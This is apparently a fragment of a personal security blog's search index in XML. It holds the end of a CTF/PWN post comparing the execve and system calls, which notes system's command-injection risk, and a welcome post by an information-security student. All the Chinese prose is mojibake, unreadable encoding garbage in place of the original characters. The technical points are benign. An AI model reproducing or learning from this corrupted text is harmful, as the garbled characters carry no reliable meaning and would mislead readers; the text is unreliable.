title="åŒºåˆ«æ€»ç»“"></a>åŒºåˆ«æ€»ç»“</h3><ol><li><p><strong>æ‰§è¡Œç¯å¢ƒ</strong>ï¼š</p><ul><li><code>execve</code>ï¼šæ›¿æ¢å½“å‰è¿›ç¨‹çš„æ‰§è¡Œç¯å¢ƒã€‚</li><li><code>system</code>ï¼šåœ¨å­è¿›ç¨‹ä¸­æ‰§è¡Œå‘½ä»¤ï¼Œçˆ¶è¿›ç¨‹ç­‰å¾…å­è¿›ç¨‹å®Œæˆã€‚</li></ul></li><li><p><strong>çµæ´»æ€§</strong>ï¼š</p><ul><li><code>execve</code>ï¼šæ›´çµæ´»ï¼Œå¯ä»¥ç›´æ¥æŒ‡å®šç¨‹åºè·¯å¾„ã€å‚æ•°å’Œç¯å¢ƒå˜é‡ã€‚</li><li><code>system</code>ï¼šä¾èµ– shellï¼Œé€‚åˆæ‰§è¡Œç®€å•çš„å‘½ä»¤å­—ç¬¦ä¸²ã€‚</li></ul></li><li><p><strong>ä¾èµ–æ€§</strong>ï¼š</p><ul><li><code>execve</code>ï¼šä¸ä¾èµ– shellã€‚</li><li><code>system</code>ï¼šä¾èµ– <code>/bin/sh</code>ã€‚</li></ul></li><li><p><strong>è¿”å›å€¼å’Œæ§åˆ¶æµ</strong>ï¼š</p><ul><li><code>execve</code>ï¼šæˆåŠŸæ‰§è¡Œåä¸ä¼šè¿”å›ï¼›å¤±è´¥æ—¶è¿”å›é”™è¯¯ç ã€‚</li><li><code>system</code>ï¼šè¿”å›å­è¿›ç¨‹çš„çŠ¶æ€ç æˆ–é”™è¯¯ç ã€‚</li></ul></li></ol><h3 id="é€‚ç”¨åœºæ™¯"><a href="#é€‚ç”¨åœºæ™¯" class="headerlink" title="é€‚ç”¨åœºæ™¯"></a>é€‚ç”¨åœºæ™¯</h3><ul><li>ä½¿ç”¨ <code>execve</code>ï¼šå½“éœ€è¦ç²¾ç¡®æ§åˆ¶æ–°ç¨‹åºçš„æ‰§è¡Œç¯å¢ƒæ—¶ï¼Œå¦‚ä¼ é€’ç‰¹å®šçš„å‚æ•°å’Œç¯å¢ƒå˜é‡ã€‚</li><li>ä½¿ç”¨ <code>system</code>ï¼šå½“åªéœ€è¦æ‰§è¡Œä¸€ä¸ªç®€å•çš„å‘½ä»¤å­—ç¬¦ä¸²ï¼Œå¹¶ä¸éœ€è¦ç²¾ç»†æ§åˆ¶å‘½ä»¤çš„æ‰§è¡Œç¯å¢ƒæ—¶ã€‚</li></ul><h3 id="å®‰å…¨æ€§"><a href="#å®‰å…¨æ€§" class="headerlink" title="å®‰å…¨æ€§"></a>å®‰å…¨æ€§</h3><ul><li><code>system</code>ï¼šç”±äºä¾èµ– shellï¼Œå­˜åœ¨å‘½ä»¤æ³¨å…¥é£é™©ï¼Œç‰¹åˆ«æ˜¯åœ¨å¤„ç†ç”¨æˆ·è¾“å…¥æ—¶éœ€è¦æ ¼å¤–å°å¿ƒã€‚</li><li><code>execve</code>ï¼šä¸ä¾èµ– shellï¼Œå› æ­¤æ›´å®‰å…¨ï¼Œä½†éœ€è¦æ›´å¤æ‚çš„è°ƒç”¨å‚æ•°ã€‚</li></ul><p>é€šè¿‡è¿™äº›åŒºåˆ«å’Œç‰¹ç‚¹ï¼Œå¼€å‘è€…å¯ä»¥æ ¹æ®å…·ä½“éœ€æ±‚é€‰æ‹©åˆé€‚çš„å‡½æ•°æ¥æ‰§è¡Œå¤–éƒ¨ç¨‹åºã€‚</p>]]></content>
      
      
      <categories>
          
          <category> å®‰å…¨ </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Helloå‘€~ğŸ‘ğŸ‘ğŸ‘</title>
      <link href="/posts/c1e7930e/"/>
      <url>/posts/c1e7930e/</url>
      
        <content type="html"><![CDATA[<h1 id="ğŸ‰"><a href="#ğŸ‰" class="headerlink" title="ğŸ‰"></a>ğŸ‰</h1><p>æ¬¢è¿æ¥åˆ°æˆ‘çš„å°ç«™~~~</p><p>ï¼ˆåŠŸèƒ½æ…¢æ…¢å¼€å‘ä¸­å“¦ <strong>0.o</strong>ï¼‰</p><h1 id="âœ¨"><a href="#âœ¨" class="headerlink" title="âœ¨"></a>âœ¨</h1><p>æœ¬äººä¿¡å®‰ä¸“ä¸šå‡†å¤§ä¸‰åœ¨è¯»ğŸ“–ğŸ“–ğŸ“–</p><p>emmmmmmmmmmmmmmmmå¥½æ—©ä¹‹å‰å°±æ‰“ç®—æ­å»ºä¸ªåšå®¢äº†ï¼Œå¥ˆä½•ä¸¥é‡æ‹–å»¶ç—‡æ‚£è€…ï¼Œä¹Ÿç®—æ˜¯ç»ˆäºã€‚ã€‚ã€‚è¿™å‡ å¤©æäº†ä¸ªå¤§æ¦‚ğŸ˜Š</p><p>ä»¥åå°±åœ¨å°ç«™ä¸Šåˆ†äº«ä¸€ä¸‹å¹³å¸¸çš„ctfåšé¢˜å¿ƒå¾—å’Œå®‰å…¨æ–¹é¢ç›¸å…³çŸ¥è¯†äº†  lalalalalalllllllllllll</p><p>ä¹Ÿéšä¾¿è®°ä¸‹ç”Ÿæ´»ä¸­çš„äº‹æƒ…</p><p>ä¸å–œå‹¿å–·o</p><p>æ•æ„Ÿå®³ç¾è…¼è…†ç¤¾ææ–‡é™è¶…iå°å¥³ç”Ÿä¸€æš <code>_oTATo_</code>(ç¬”èŠ¯)â¤ï¸</p><h1 id="ğŸš€"><a href="#ğŸš€" class="headerlink" title="ğŸš€"></a>ğŸš€</h1><p>æœ¬äººå®åœ¨æ˜¯å®åŠ›æœ‰é™ï¼ŒèŒæ–°ä¸€æš</p><p>ä¸å¯¹çš„åœ°æ–¹å¤šå¤šæŒ‡å¯¼laâ­</p><p>ä¹Ÿå¸Œæœ›è¿™ä¸ªå°ç ´ç«™èƒ½æ¿€åŠ±æˆ‘å¤šå¤šå†™ç¬”è®°ï¼Œæ—©æ—¥å˜æˆå¤§ä½¬ï¼ï¼ï¼ğŸ“£</p><h1 id="ğŸ“š"><a href="#ğŸ“š" class="headerlink" title="ğŸ“š"></a>ğŸ“š</h1><p>å°±è¿™æ ·å§ï¼Œæ¥ï¼Œæ‘†ä¸ªpose</p><p>æ‹å¼ ç…§åšä¸ªç•™å¿µ </p><p>ğŸ“·ğŸ“·ğŸ“·</p><p>Ok ï¼Œå·å»å’¯ <strong>&gt;__&lt;</strong></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
